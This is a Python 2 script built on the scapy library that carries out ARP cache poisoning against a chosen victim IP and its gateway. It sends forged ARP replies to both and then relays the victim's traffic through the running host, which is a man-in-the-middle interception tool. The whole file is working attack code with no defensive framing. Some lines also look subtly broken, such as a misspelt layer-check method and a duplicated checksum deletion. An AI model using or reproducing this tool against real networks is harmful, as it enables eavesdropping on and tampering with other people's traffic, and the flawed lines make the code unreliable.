import threading
import time
import sys
from scapy.all import *
# Input IP
dip = raw_input()

# Get Source Mac, Destination Mac, Destination IP
results, unanswered = sr(ARP(op=ARP.who_has, pdst=dip))

r = str(results[0])
r = r.split("hwsrc=")[1]
vmac = r.split("psrc")[0].strip()
r = r.split("hwdst=")[1]
m = r.split("pdst=")[0].strip()
r =r.split("pdst=")[1]
ip = r.split("|")[0].strip()

dev = conf.iface

g = str(conf.route)
g = g.split(dev)[0]
g = g.split()
g_n = len(g)

rip = g[g_n-1]

results, unanswered = sr(ARP(op=ARP.who_has, pdst=rip))

r = str(results[0])
r = r.split("hwsrc=")[1]

rmac = r.split("psrc")[0].strip()

Victim = ARP()
Victim.op=2
Victim.psrc=rip
Victim.pdst=dip
Victim.hwdst=vmac

Gateway = ARP()
Gateway.op=2
Gateway.psrc=dip
Gateway.pdst=rip
Gateway.hwdst=rmac

send(Victim)
send(Gateway)

def poisoning(packet):
	if ARP in packet:
			# Send to Layer 3
			send(Victim)
			send(Gateway)
			print "Poisoned! Check arp -a ... Relaying...."
	else:
		if packet[IP].src==dip:
			packet[Ether].src = m
			packet[Ether].dst = rmac
			if packet.hasclearlayer(UDP) == 1:
				del packet[UDP].chksum,packet[UDP].len		
			del packet.chksum,packet.chksum
			# Send in Layer 2
			sendp(packet)
		if packet[IP].dst==dip:
			packet[Ether].src = m
			packet[Ether].dst = vmac
			if packet.haslayer(UDP) == 1:
				del packet[UDP].chksum,packet[UDP].len
			del packet.len,packet.chksum
			# Send in Layer 2
			sendp(packet)
while True:
	sniff(prn=poisoning, filter="host "+rip+" or host "+dip, count=1)


